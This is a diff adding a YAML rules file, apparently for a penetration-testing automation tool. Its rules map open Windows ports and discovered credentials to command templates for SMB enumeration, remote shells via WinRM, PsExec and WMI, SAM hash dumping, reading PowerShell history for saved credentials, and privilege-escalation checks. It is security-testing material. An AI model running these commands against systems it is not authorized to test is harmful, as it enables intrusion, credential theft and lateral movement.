@@ -1,0 +1,128 @@
+# ─────────────────────────────────────────────────
+# Windows target rules (non-AD / standalone)
+# Fires when indicators suggest a Windows host
+# ─────────────────────────────────────────────────
+
+# ── SMB Unauthenticated ──────────────────────────
+
+- id: win_enum4linux
+  name: enum4linux-ng Full Scan
+  description: Run full enum4linux-ng scan for OS info, shares, users, and policies.
+  priority: P1
+  conditions:
+    require_ports: [445]
+  command_template: enum4linux-ng -A {IP}
+  source_reference: https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb
+
+- id: win_smb_signing
+  name: SMB Signing Check
+  description: Check if SMB signing is required — disabled signing enables relay attacks.
+  priority: P2
+  conditions:
+    require_ports: [445]
+  command_template: nxc smb {IP} --gen-relay-list relay.txt
+  source_reference: https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ntlm-relay
+
+# ── Authenticated Access ─────────────────────────
+
+- id: win_winrm_login
+  name: WinRM Shell Access
+  description: Use discovered credentials to get a PowerShell shell via WinRM.
+  priority: P1
+  conditions:
+    require_ports: [5985]
+    require_state: [has_valid_user, has_valid_password]
+  command_template: evil-winrm -i {IP} -u {USER} -p '{PASS}'
+  source_reference: https://book.hacktricks.xyz/network-services-pentesting/5985-5986-pentesting-winrm
+
+- id: win_rdp_login
+  name: RDP Login
+  description: Connect via RDP with discovered credentials.
+  priority: P1
+  conditions:
+    require_ports: [3389]
+    require_state: [has_valid_user, has_valid_password]
+  command_template: xfreerdp /v:{IP} /u:{USER} /p:'{PASS}' /dynamic-resolution +clipboard
+  source_reference: https://book.hacktricks.xyz/network-services-pentesting/pentesting-rdp
+
+- id: win_psexec_creds
+  name: PsExec with Credentials
+  description: Get a SYSTEM shell via SMB using credentials.
+  priority: P1
+  conditions:
+    require_ports: [445]
+    require_state: [has_valid_user, has_valid_password]
+  command_template: impacket-psexec {USER}:'{PASS}'@{IP}
+  source_reference: https://book.hacktricks.xyz/windows-hardening/lateral-movement/psexec-and-winexec
+
+- id: win_wmiexec_creds
+  name: WMIExec with Credentials
+  description: Get a semi-interactive shell via WMI (stealthier than PsExec).
+  priority: P2
+  conditions:
+    require_ports: [135]
+    require_state: [has_valid_user, has_valid_password]
+  command_template: impacket-wmiexec {USER}:'{PASS}'@{IP}
+  source_reference: https://book.hacktricks.xyz/windows-hardening/lateral-movement/wmiexec
+
+- id: win_smbclient_auth
+  name: SMB Share Access
+  description: Browse SMB shares with authenticated access.
+  priority: P2
+  conditions:
+    require_ports: [445]
+    require_state: [has_valid_user, has_valid_password]
+  command_template: smbclient -U '{USER}%{PASS}' -L //{IP}
+  source_reference: https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb
+
+# ── Post-Exploitation ────────────────────────────
+
+- id: win_winpeas
+  name: Windows Privilege Escalation Scan
+  description: Run WinPEAS to find local privesc vectors.
+  priority: P1
+  conditions:
+    require_state: [has_valid_user, has_valid_password]
+    jmespath: "length(ports[?port==`5985` || port==`3389` || port==`445`]) > `0`"
+  command_template: "# Upload and run: winPEASx64.exe"
+  source_reference: https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation
+
+- id: win_sam_dump
+  name: Local SAM Dump
+  description: Dump local SAM database hashes from a compromised Windows host.
+  priority: P1
+  conditions:
+    require_ports: [445]
+    require_state: [has_valid_user, has_valid_password]
+  command_template: impacket-secretsdump {USER}:'{PASS}'@{IP}
+  source_reference: https://book.hacktricks.xyz/windows-hardening/stealing-credentials
+
+- id: win_powershell_history
+  name: PowerShell History Check
+  description: Check ConsoleHost_history.txt for saved credentials or commands.
+  priority: P2
+  conditions:
+    require_state: [has_valid_user, has_valid_password]
+    jmespath: "length(ports[?port==`5985`]) > `0`"
+  command_template: "type C:\\Users\\{USER}\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt"
+  source_reference: https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#powershell-history
+
+- id: win_always_install_elevated
+  name: AlwaysInstallElevated Check
+  description: Check registry for AlwaysInstallElevated — enables MSI-based privesc.
+  priority: P2
+  conditions:
+    require_state: [has_valid_user, has_valid_password]
+    jmespath: "length(ports[?port==`5985` || port==`3389`]) > `0`"
+  command_template: "reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated"
+  source_reference: https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#alwaysinstallelevated
+
+- id: win_unquoted_service
+  name: Unquoted Service Path Check
+  description: Find services with unquoted paths for DLL hijacking.
+  priority: P3
+  conditions:
+    require_state: [has_valid_user, has_valid_password]
+    jmespath: "length(ports[?port==`5985` || port==`3389`]) > `0`"
+  command_template: "wmic service get name,displayname,pathname,startmode | findstr /i /v \"C:\\Windows\\\\\""
+  source_reference: https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#unquoted-service-paths
